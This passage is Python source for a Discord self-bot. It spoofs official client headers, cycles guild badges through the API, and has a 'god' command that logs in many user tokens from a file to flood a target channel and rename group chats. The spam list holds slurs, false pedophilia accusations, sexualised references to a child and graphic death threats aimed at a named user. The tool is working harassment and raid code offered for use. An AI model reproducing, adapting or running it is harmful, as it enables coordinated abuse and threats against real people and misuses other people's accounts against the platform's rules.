        "x-super-properties": "eyJvcyI6ImlPUyIsImJyb3dzZXIiOiJTYWZhcmkiLCJkZXZpY2UiOiJpUGFkIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKGlQYWQ7IENQVSBPUyAxNl81IGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi41IE1vYmlsZS8xNUUxNDggU2FmYXJpLzYwNC4xIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTYuNSIsIm9zX3ZlcnNpb24iOiIxNi41IiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDY4NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    },

    "android": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "user-agent": "Discord-Android/126021",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IkFuZHJvaWQiLCJicm93c2VyIjoiRGlzY29yZCBBbmRyb2lkIiwiZGV2aWNlIjoiUGl4ZWwgNiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImNsaWVudF92ZXJzaW9uIjoiMTI2LjIxIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiZGV2aWNlX3ZlbmRvcl9pZCI6Ijg4OGJhMTYwLWEwMjAtNDNiYS05N2FmLTYzNTFlNjE5ZjA0MSIsImJyb3dzZXJfdXNlcl9hZ2VudCI6IiIsImJyb3dzZXJfdmVyc2lvbiI6IiIsIm9zX3ZlcnNpb24iOiIzMSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEyNjAyMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    },

    "ios": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "user-agent": "Discord-iOS/126021",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6ImlPUyIsImJyb3dzZXIiOiJEaXNjb3JkIGlPUyIsImRldmljZSI6ImlQaG9uZSAxNCBQcm8iLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJjbGllbnRfdmVyc2lvbiI6IjEyNi4yMSIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImRldmljZV92ZW5kb3JfaWQiOiI5OTkxMTgyNC01NjczLTQxNDQtYTU3NS0xMjM0NTY3ODkwMTIiLCJicm93c2VyX3VzZXJfYWdlbnQiOiIiLCJicm93c2VyX3ZlcnNpb24iOiIiLCJvc192ZXJzaW9uIjoiMTYuNSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEyNjAyMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }
}



from itertools import cycle
 
AVAILABLE_BADGES = list(range(1, 21)) 
PRESET_COLORS = [
    "#ff1c90", "#ff7fc0",  
    "#ff0000", "#ff4444",  
    "#00ff00", "#44ff44",  
    "#0000ff", "#4444ff",  
    "#ffff00", "#ffff44",  
    "#ff00ff", "#ff44ff",  
    "#00ffff", "#44ffff",  
    "#ffffff", "#cccccc",  
    "#000000", "#444444" ,
    "#FFB3BA", "#FFDFBA",  
    "#FFFFBA", "#BAFFC9",  
    "#BAE1FF", "#D7B3FF",  
    "#FFB3E6", "#FFC3A0",  
    "#FADADD", "#FFDAC1",  
    "#B5EAD7", "#C7CEEA",  
    "#FF9AA2", "#FFB7B2",  
    "#FFDAC1", "#E2F0CB",  
    "#B2CEFE", "#D5AAFF",  
    "#F5C6EC", "#C8E6C9",  
]

guild_rotate_tasks = {}
guild_rotation_settings = {
    'delay': 10,
    'enabled': False
}
async def rotate_guild_settings(ctx):
    guild_id = ctx.guild.id
    headers = {
        'Authorization': usertoken,
        'Content-Type': 'application/json'
    }
    
    badges = cycle(AVAILABLE_BADGES)
    colors = cycle(PRESET_COLORS)
    current_color = guild_rotation_settings.get('fixed_color', next(colors))
    
    while guild_rotation_settings['enabled']:
        try:
            payload = {
                'badge': next(badges),
                'badge_color_primary': current_color if guild_rotation_settings.get('fixed_color') else next(colors),
                'badge_color_secondary': current_color if guild_rotation_settings.get('fixed_color') else next(colors)
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.patch(f'https://canary.discord.com/api/v9/clan/{guild_id}/settings', 
                                      headers=headers, json=payload) as resp:
                    if resp.status == 200:
                        print(f"Updated guild settings: Badge {payload['badge']}")
                        
            await asyncio.sleep(guild_rotation_settings['delay'])
                
        except Exception as e:
            print(f"Error: {e}")
            await asyncio.sleep(5)
@bot.command()
async def cycleguild(ctx, action=None, *args):
    if action == "start":
        if ctx.guild is None:
            await ctx.send("```This command must be used in a server```")
            return
            
        guild_id = ctx.guild.id
        if guild_id in guild_rotate_tasks:
            await ctx.send("```Guild rotation is already running```")
            return
        
        guild_rotation_settings['enabled'] = True
        guild_rotate_tasks[guild_id] = asyncio.create_task(rotate_guild_settings(ctx))
        await ctx.send("```Started automatic guild rotation```")

    elif action == "fixcolor":
        if not args:
            guild_rotation_settings.pop('fixed_color', None)
            await ctx.send("```Disabled fixed color, will rotate colors```")
        else:
            color = args[0] if args[0].startswith('#') else f'#{args[0]}'
            guild_rotation_settings['fixed_color'] = color
            await ctx.send(f"```Set fixed color to {color}```")
    elif action == "stop":
        if ctx.guild and ctx.guild.id in guild_rotate_tasks:
            guild_rotation_settings['enabled'] = False
            guild_rotate_tasks[ctx.guild.id].cancel()
            del guild_rotate_tasks[ctx.guild.id]
            await ctx.send("```Stopped guild rotation```")
        else:
            await ctx.send("```No guild rotation running```")
            
    elif action == "delay":
        if not args:
            await ctx.send("```Please specify delay in seconds```")
            return
        try:
            guild_rotation_settings['delay'] = float(args[0])
            await ctx.send(f"```Set rotation delay to {args[0]} seconds```")
        except ValueError:
            await ctx.send("```Invalid delay value```")

    elif action == "listbadges":
        badges_list = "\n".join(f"Badge {i}" for i in AVAILABLE_BADGES)
        await ctx.send(f"```Available Badges:\n{badges_list}```")

    elif action == "listcolors":
        colors_list = "\n".join(f"Color: {color}" for color in PRESET_COLORS)
        await ctx.send(f"```Available Colors:\n{colors_list}```")

    elif action == "badge":
        if len(args) < 1:
            await ctx.send("```Please specify badge number```")
            return
        try:
            badge_num = int(args[0])
            if badge_num not in AVAILABLE_BADGES:
                await ctx.send("```Invalid badge number```")
                return
                
            headers = {
                'Authorization': usertoken,
                'Content-Type': 'application/json'
            }
            
            payload = {'badge': badge_num}
            url = f'https://canary.discord.com/api/v9/clan/{ctx.guild.id}/settings'
            
            async with aiohttp.ClientSession() as session:
                async with session.patch(url, headers=headers, json=payload) as resp:
                    if resp.status == 200:
                        await ctx.send(f"```Successfully set badge to {badge_num}```")
                    else:
                        await ctx.send(f"```Failed to set badge: {resp.status}```")
        except ValueError:
            await ctx.send("```Invalid badge number```")

    elif action == "color":
        if len(args) < 2:
            await ctx.send("```Please specify badge number and color (hex)```")
            return
        try:
            badge_num = int(args[0])
            color = args[1]
            
            if badge_num not in AVAILABLE_BADGES:
                await ctx.send("```Invalid badge number```")
                return
                
            if not color.startswith('#'):
                color = f'#{color}'
                
            headers = {
                'Authorization': usertoken,
                'Content-Type': 'application/json'
            }
            
            payload = {
                'badge': badge_num,
                'badge_color_primary': color,
                'badge_color_secondary': color
            }
            
            url = f'https://canary.discord.com/api/v9/clan/{ctx.guild.id}/settings'
            
            async with aiohttp.ClientSession() as session:
                async with session.patch(url, headers=headers, json=payload) as resp:
                    if resp.status == 200:
                        await ctx.send(f"```Successfully set badge {badge_num} color to {color}```")
                    else:
                        await ctx.send(f"```Failed to set badge color: {resp.status}```")
        except ValueError:
            await ctx.send("```Invalid badge number```")
            
    else:
        await ctx.send("""```
Guild Rotation Commands:
guildrotate start - Start automatic rotation
guildrotate stop - Stop rotation
guildrotate delay <seconds> - Set rotation delay
guildrotate listbadges - List all available badges
guildrotate listcolors - List all preset colors
guildrotate badge <number> - Set specific badge
guildrotate color <badge_number> <color> - Set badge color
```""")
user_activity_tracking = {}  
server_activity_tracking = {}  


import discord
import asyncio
import random
from discord.ext import commands

# Load tokens from tokens.txt
with open("tokens.txt", "r") as f:
    TOKENS = [line.strip() for line in f if line.strip()]

SPAM = [
    "yo pedo shut the fuck up ",
    "yo ur fucking\nass\npedo\nfuck",
    "shut the fuck up cuck old named {name}", "yo shit fuck named {name}", "# /passed RUNS U\n# /passed RUNS U\n# /passed RUNS U\n# /passed RUNS U\n# /passed RUNS U\n# /passed RUNS U\n",
    "ur\nmy\nbitch\nbtw", 
    "you're hideous bitch shut up and clean my dogs feces {name}",
    "hey slut come lick my armpits {name}", 
    "shut the fuck up {name}", 
    "bitch shut up {name}",
    "you are ass nigga you wanna be me so bad {name}", 
    "why do your armpits smell like that {name}",
    "stop eating horse semen you faggot", 
    "get the fuck up from the floor {name}",
    "why are you drinking tap water out of that goat's anus {name}", 
    "say something back bitch",  
    "useless pedophile ", 
    "yo {name} shut the fuck up lol ",
    "ill cum in your mouth booty shake ass nigga ", 
    "type in chat stop fingering your booty hole {name}",
    "i heard you worship cat feces {name}", 
    "worthless ass slave ", 
    "get your head out of that toilet you slut {name}",
    "ur weak {name} ",  
    "fuck up baby fucker {name}",
    "wipe my cum off ur girls ass cheeks pedo", 
    "hey i heard you eat your own hemorrhoids {name}",
    "shes only 5 get your dick off of her nipples pedo ", 
    "filthy faggot ",
    "and\n{name}\ndied\nto\nme",
    "weak pedophile named {name}", 
    " yo {name} i heard ur mothers abuses you",
    "shut up weak fuck",
    "{name}\nu\nass\nas\nfuck\nshut\nthe\nfuck\nup\nwhore",
    "ill punch ur ripcage {name}",
    "yo {name} shut the fuck up before i bodyslam you",
    "yo\ngay\nboy\nstop\nasking\nme\nto\nesex\nin\ndms\n",
    "pedophile died",
    "we dont fw u {name}",
    "nigga {name} you got cucked LOL",
    "stop obsessing over my penis pedo",
    "ill\nrip\nur\nfucking\nteeth\nout\n {name}",
    "ill take a bath in ur fucking blood son"
    "ill drink ur blood while i feast on ur organs {name}",
    "pedo boy died LOL",
    "yo {name} is it true u watched ur girl get a train ran on her?",
    "ill\nrip\nevery\nsingle\none\nof\nur\nfamily\nmembers\nguts out\n",
    "# drop\ndead weak pedo",
    "stop leeching of me {name}",
    "yo\nill\nrip\nur\norgans\noff",
    "yo\npeon\ni\ndont\nrate\nu\nloser",
    "piss\nkink\nloser",
    "ur\nso\nfucking\nass",
    "# ur\n# ass",
    "FUCK ASS BOY UR NOT OUTLASTING THE GOAT APOP LOL U WEAK FUCK {name}",
    "YO WEAK PEDOPHILE\nILL RIP UR ORGANS OUT\n{name}"
    "pedo fuck named {name}",
    "ill rip ur organs out bitch",
    "hey {name}\n u ugly as shit"
]

# Load group chat name prefixes from gcname.txt
with open("gcnames.txt", "r", encoding="utf-8") as f:
    GC_NAMES = [line.strip() for line in f if line.strip()]

running_tasks = {}  # Dictionary to track running tasks
class GODCLIENT(discord.Client):
    def __init__(self, token, delay, channel_id, user_to_ping, name, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.delay = delay
        self.channel_id = channel_id
        self.user_to_ping = user_to_ping
        self.name = name
        self.running = True  # Used to stop the loop safely
        self.task = None  # Store task reference for cancellation

    async def on_ready(self):
        print(f"GOD CLIENT ACTIVE: {self.user}")
        channel = self.get_channel(self.channel_id)

        while self.running:
            if not channel:
                try:
                    channel = await self.fetch_channel(self.channel_id)
                except discord.Forbidden:
                    print("No access to the channel.")
                    return
                except discord.NotFound:
                    print("Invalid channel ID.")
                    return

            # Spam message with name included
            spam_message = random.choice(SPAM).replace("{name}", self.name)
            message = f"{spam_message} <@{self.user_to_ping}>" if self.user_to_ping else spam_message

            if message and channel:
                try:
                    await channel.send(message)
                except discord.Forbidden:
                    print(f"Message blocked: {message}")
                except Exception as e:
                    print(f"Error: {e}")

            # Rename the group chat
            await self.rename_channel()

            await asyncio.sleep(self.delay)

    async def rename_channel(self):
        """Renames the channel while spamming"""
        channel = self.get_channel(self.channel_id)

        if channel is None:
            try:
                channel = await self.fetch_channel(self.channel_id)
            except discord.Forbidden:
                print("No access to rename channel.")
                return
            except discord.NotFound:
                print("Invalid channel ID.")
                return

        new_name = f"{random.choice(GC_NAMES)} {self.name}"

        try:
            await channel.edit(name=new_name)
            print(f"Renamed to {new_name}")
        except discord.Forbidden:
            print(f"Failed to rename {self.channel_id}")
        except Exception as e:
            print(f"Rename error: {e}")

    async def stop(self):
        """Stops the spamming"""
        self.running = False  # Stop loop
        print(f"Stopping {self.user}...")

        # Cancel the spam task if running
        if self.task and not self.task.done():
            self.task.cancel()
            print(f"Task for {self.user} cancelled!")

        await self.close()  # Properly close the bot
        print(f"Client {self.user} disconnected.")



@bot.command()
async def god(ctx, user_id: int, channel_id: int, name: str, delay: float = 3.0):
    


    if channel_id in running_tasks:
        await ctx.send(f"Spamming is already active in <#{channel_id}>!")
        return

    await ctx.send(f"**GOD CLIENT SPAM & RENAMING STARTED IN <#{channel_id}>...**")

    tasks = []
    for token in TOKENS:
        client = GODCLIENT(token, delay, channel_id, user_id, name, intents=discord.Intents.default())
        task = asyncio.create_task(client.start(token, bot=False))  # Store the task
        client.task = task  # Link the task to the client

        tasks.append(client)  # Store client object

    running_tasks[channel_id] = tasks



@bot.command()
async def gode(ctx, channel_id: int = None):
   
    if channel_id:
        if channel_id in running_tasks:
            for client in running_tasks[channel_id]:  
                if isinstance(client, GODCLIENT):
                    await client.stop()  

            del running_tasks[channel_id]  # Remove from tracking
            await ctx.send(f"**Stopped GOD client for <#{channel_id}>**")
        else:
            await ctx.send(f"No active tasks found for <#{channel_id}>")

    else:
        for key in list(running_tasks.keys()):
            for client in running_tasks[key]:
                if isinstance(client, GODCLIENT):
                    await client.stop()  

            del running_tasks[key]

        await ctx.send("**ALL GOD CLIENTS TERMINATED.**")

DISCORD_HEADERS = {
    "standard": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-discord-timezone": "America/New_York",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDY4NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    },

    "client": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3fQ=="
    },

    "mobile": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Google Chrome";v="121", "Not A(Brand";v="99", "Chromium";v="121"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "user-agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IkFuZHJvaWQiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiUGl4ZWwgNiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMzsgUGl4ZWwgNikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEyMS4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    },

    "firefox": {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.5",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEyMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEyMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjUwNjg0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
    },

    "byoass": {
            "authority": "discord.com",
            "method": "PATCH",
            "scheme": "https",
            "accept": "/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "authorization": bot.http.token,
            "origin": "https://discord.com/",
            "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": "Asia/Calcutta",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJkZXNpZ25faWQiOjB9"
    },

    "desktop": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108"',
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3fQ=="
    },

    "electron": {
        "authority": "discord.com",
        "method": "PATCH",
        "path": "/api/v9/users/@me",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9021 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIxIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MjEiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjEgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzgsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE4fQ=="
    },

    "opera": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Opera GX";v="105", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiT3BlcmEgR1giLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIxIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MjEiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExOS4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMDUuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMDUuMC4wLjAiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzgsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE4fQ=="
    },

    "legacy": {
        "authority": "discord.com",
        "method": "PATCH",
        "scheme": "https",
        "accept": "/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "origin": "https://discord.com/",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
